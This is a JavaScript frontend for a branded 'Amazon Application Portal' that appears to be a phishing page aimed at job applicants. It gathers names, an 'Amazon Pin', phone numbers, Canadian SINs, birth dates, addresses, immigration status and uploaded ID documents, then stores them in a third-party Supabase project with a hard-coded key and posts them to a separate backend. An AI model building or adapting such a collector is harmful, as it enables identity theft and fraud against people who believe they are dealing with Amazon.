/*************************************************
 * Amazon Application Portal – Frontend Logic
 * - Page 2 (info.html): validate + stash to localStorage
 * - Page 3 (submit.html): validate + upload file + insert row
 * - Supabase: applications table + documents (private bucket)
 * - Backend: POST JSON to /api/applications
 **************************************************/

/************ CONSTANTS ************/
const REQUIRED_ALERT = 'Please Submit all the documents before submission.'; // exact text
const SUPABASE_URL = 'https://dtabrykztmkkabyeljka.supabase.co';
const SUPABASE_ANON_KEY =
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR0YWJyeWt6dG1ra2FieWVsamthIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE1MTQ2MjMsImV4cCI6MjA3NzA5MDYyM30.TrqsNYzbPbvVyUg2XS7scoTy9zYSmR7he2Gbi89TC-8';
const STORAGE_BUCKET = 'documents'; // private bucket
const BACKEND_BASE = 'http://localhost:3000';
const BACKEND_ENDPOINT = `${BACKEND_BASE}/api/applications`;

/************ HELPERS (Page2 ↔ Page3 handoff) ************/
const saveInfo = (obj) => localStorage.setItem('infoForm', JSON.stringify(obj));
const loadInfo = () => {
  try { return JSON.parse(localStorage.getItem('infoForm') || '{}'); }
  catch { return {}; }
};
const jsonFetch = async (url, body) => {
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  if (!res.ok) throw new Error(`Backend HTTP ${res.status}`);
  return res.json().catch(() => ({}));
};

/************ LOAD SUPABASE SDK + INIT CLIENT ************/
let supabaseClient = null;

function ensureSupabaseLoaded() {
  return new Promise((resolve, reject) => {
    function init() {
      try {
        supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        resolve(supabaseClient);
      } catch (e) {
        reject(e);
      }
    }
    if (window.supabase) return init();

    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
    script.onload = init;
    script.onerror = () => reject(new Error('Failed to load Supabase SDK'));
    document.head.appendChild(script);
  });
}

/************ PAGE 2: info.html ************/
const infoForm = document.getElementById('infoForm');
if (infoForm) {
  infoForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const fd = new FormData(infoForm);
    const data = Object.fromEntries(fd.entries());

    // Required checks
    if (!data.name || !data.email || !data.amazon_pin || !data.mobile || !data.employment_type) {
      alert(REQUIRED_ALERT);
      return;
    }
    if (!/^\d{6}$/.test(data.amazon_pin)) {
      alert('Amazon Pin must be 6 digits.');
      return;
    }

    saveInfo(data);
    window.location.href = 'submit.html';
  });
}

/************ PAGE 3: submit.html ************/
const submitForm = document.getElementById('submitForm');
if (submitForm) {
  submitForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Disable button to prevent double-submits
    const submitBtn = submitForm.querySelector('button[type="submit"]');
    submitBtn.disabled = true;

    try {
      const p2 = loadInfo();
      const fd = new FormData(submitForm);
      const p3 = Object.fromEntries(fd.entries());

      // Validate required fields across both pages
      const requiredP2 = ['name', 'email', 'amazon_pin', 'mobile', 'employment_type'];
      const requiredP3 = ['address', 'postal_code', 'arrived_date', 'dob', 'sin', 'status_in_canada'];

      const missingP2 = requiredP2.some((k) => !p2[k]);
      const missingP3 = requiredP3.some((k) => !p3[k]);

      if (missingP2 || missingP3) throw new Error(REQUIRED_ALERT);
      if (!/^\d{9}$/.test(p3.sin)) throw new Error('SIN must be 9 digits.');

      await ensureSupabaseLoaded();

      /************ Optional file upload ************/
      let document_path = null;
      let document_url = null;

      const file = document.getElementById('document')?.files?.[0] || null;
      if (file) {
        const allowed = ['application/pdf', 'image/jpeg', 'image/png'];
        const maxBytes = 10 * 1024 * 1024;
        if (!allowed.includes(file.type)) throw new Error('Only PDF, JPG, or PNG allowed.');
        if (file.size > maxBytes) throw new Error('File too large (max 10MB).');

        const safeName = file.name.replace(/[^a-z0-9._-]/gi, '_');
        document_path = `uploads/${Date.now()}_${safeName}`;

        // Upload to private bucket
        const { error: upErr } = await supabaseClient
          .storage.from(STORAGE_BUCKET)
          .upload(document_path, file, { upsert: false });

        if (upErr) throw upErr;

        // Signed URL for 7 days
        const { data: signed, error: signErr } = await supabaseClient
          .storage.from(STORAGE_BUCKET)
          .createSignedUrl(document_path, 60 * 60 * 24 * 7);

        if (signErr) throw signErr;
        document_url = signed?.signedUrl || null;
      }

      /************ Insert into Supabase table ************/
      const payload = {
        // Page 2
        name: p2.name,
        email: p2.email,
        amazon_pin: p2.amazon_pin,
        mobile: p2.mobile,
        employment_type: p2.employment_type,
        // Page 3
        sin: p3.sin,
        address: p3.address,
        postal_code: p3.postal_code,
        arrived_date: p3.arrived_date,
        dob: p3.dob,
        status_in_canada: p3.status_in_canada,
        // File
        document_path,
        document_url
      };

      const { error: insertErr } = await supabaseClient.from('applications').insert(payload);
      if (insertErr) throw insertErr;

      /************ Send to your backend as well ************/
      try {
        await jsonFetch(BACKEND_ENDPOINT, payload);
      } catch (be) {
        // Non-fatal: log for devs, proceed to success page anyway
        console.warn('Backend POST failed:', be?.message || be);
      }

      // ✅ Success → go to success page
      window.location.href = 'success.html';
    } catch (err) {
      console.error(err);
      alert(typeof err?.message === 'string' ? err.message : 'Submission failed.');
      submitBtn.disabled = false;
    }
  });
}
